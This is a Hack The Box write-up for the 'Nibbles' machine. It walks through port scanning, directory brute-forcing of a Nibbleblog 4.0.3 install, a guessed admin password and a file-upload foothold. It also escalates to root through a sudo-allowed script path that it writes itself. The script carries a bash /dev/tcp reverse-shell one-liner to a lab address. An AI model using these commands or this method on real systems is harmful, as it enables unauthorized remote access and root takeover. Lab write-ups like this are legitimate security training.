---

title: 🟢 HTB - Nibbles
author: Acivik
date: 2025-01-24 14:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Nibbles, walkthrough, easy, linux]

---

![https://i.ibb.co/qCtZwN0/Nibbles.png](https://i.ibb.co/qCtZwN0/Nibbles.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap detected 2 open TCP ports: 22(ssh) and 80(http)

```bash
root@kali:~/HTB/nibbles# nmap -p- 10.10.10.75 --min-rate 10000 --open -Pn -sT
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 13:08 UTC
Nmap scan report for 10.10.10.75 (10.10.10.75)
Host is up (0.082s latency).
Not shown: 65267 closed tcp ports (conn-refused), 266 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds
root@kali:~/HTB/nibbles# nmap -p22,80 --min-rate 1000 -sVC 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 13:09 UTC
Nmap scan report for 10.10.10.75 (10.10.10.75)
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
root@kali:~/HTB/nibbles#
```

# # Enumeration

## <span style="color:#0096FF">WebSite</span>

![https://i.ibb.co/fYqKrvG/Ekran-g-r-nt-s-2025-01-14-161144.png](https://i.ibb.co/fYqKrvG/Ekran-g-r-nt-s-2025-01-14-161144.png)

Let’s check source code of page

```bash
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

We found a directory name.

`/nibbleblog/` is the directory where the CMS is installed

![https://i.ibb.co/7XSLmRj/Ekran-g-r-nt-s-2025-01-14-161243.png](https://i.ibb.co/7XSLmRj/Ekran-g-r-nt-s-2025-01-14-161243.png)

We will perform directory scanning to discover more pages.

### <span style="color:#FFC300">Directory BruteForce</span>

```bash
root@kali:~/HTB/nibbles# dirsearch -u http://10.10.10.75//nibbleblog/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/HTB/nibbles/reports/http_10.10.10.75/__nibbleblog__25-01-14_13-13-13.txt

Target: http://10.10.10.75/

[13:13:13] Starting: /nibbleblog/
[13:13:27] 301 -  321B  - //nibbleblog/admin  ->  http://10.10.10.75/nibbleblog/admin/
[13:13:28] 200 -  606B  - //nibbleblog/admin.php
[13:13:28] 200 -  517B  - //nibbleblog/admin/
[13:13:28] 301 -  332B  - //nibbleblog/admin/js/tinymce  ->  http://10.10.10.75/nibbleblog/admin/js/tinymce/
[13:13:28] 200 -  564B  - //nibbleblog/admin/js/tinymce/
[13:13:45] 301 -  323B  - //nibbleblog/content  ->  http://10.10.10.75/nibbleblog/content/
[13:13:45] 200 -  485B  - //nibbleblog/content/
[13:13:46] 200 -  724B  - //nibbleblog/COPYRIGHT.txt
[13:13:57] 200 -   92B  - //nibbleblog/install.php
[13:13:58] 200 -   92B  - //nibbleblog/install.php?profile=default
[13:14:00] 301 -  325B  - //nibbleblog/languages  ->  http://10.10.10.75/nibbleblog/languages/
[13:14:00] 200 -   12KB - //nibbleblog/LICENSE.txt
[13:14:13] 301 -  323B  - //nibbleblog/plugins  ->  http://10.10.10.75/nibbleblog/plugins/
[13:14:13] 200 -  694B  - //nibbleblog/plugins/
[13:14:16] 200 -    5KB - //nibbleblog/README
[13:14:26] 301 -  322B  - //nibbleblog/themes  ->  http://10.10.10.75/nibbleblog/themes/
[13:14:26] 200 -  498B  - //nibbleblog/themes/
[13:14:28] 200 -  815B  - //nibbleblog/update.php

Task Completed
root@kali:~/HTB/nibbles#
```

`/nibbleblog/update.php` -> version of cms: 4.0.3

![https://i.ibb.co/Qk7fGDP/Ekran-g-r-nt-s-2025-01-15-171656.png](https://i.ibb.co/Qk7fGDP/Ekran-g-r-nt-s-2025-01-15-171656.png)

`/nibbleblog/admin.php` -> admin login page

![https://i.ibb.co/rHkKqRg/Ekran-g-r-nt-s-2025-01-15-171843.png](https://i.ibb.co/rHkKqRg/Ekran-g-r-nt-s-2025-01-15-171843.png)

After some trial and error, the correct credential was found.

`admin:nibbles`

# <span style="color:#AA0E1C"><b># Foothold: Shell as nibbler</b></span>

When we logged in, there was an option to upload a file under the plugins tab.

![https://i.ibb.co/ZX8rzTX/Ekran-g-r-nt-s-2025-01-14-200739.png](https://i.ibb.co/ZX8rzTX/Ekran-g-r-nt-s-2025-01-14-200739.png)

This is where the file is uploaded:

http://10.10.10.75/nibbleblog/content/private/plugins/about/profile_picture.php

```bash
root@kali:~/HTB/nibbles# nc -lnvp 1212
listening on [any] 1212 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.75] 34958
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:21:21 up  4:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: nibbler → root</b></span>

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
nibbler@Nibbles:/home/nibbler$
```

We can run the monitor.sh file as root with the sudo command.

However, the specified file path does not exist.

```bash
nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff/          
nibbler@Nibbles:/home/nibbler$ touch /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.41/4141 <&1'" > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ chmod +x /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
```

We created the file ourselves and ran it to escalate privileges.

```bash
root@kali:~/HTB/nibbles# nc -lnvp 4141
listening on [any] 4141 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.75] 37638
root@Nibbles:/home/nibbler#
```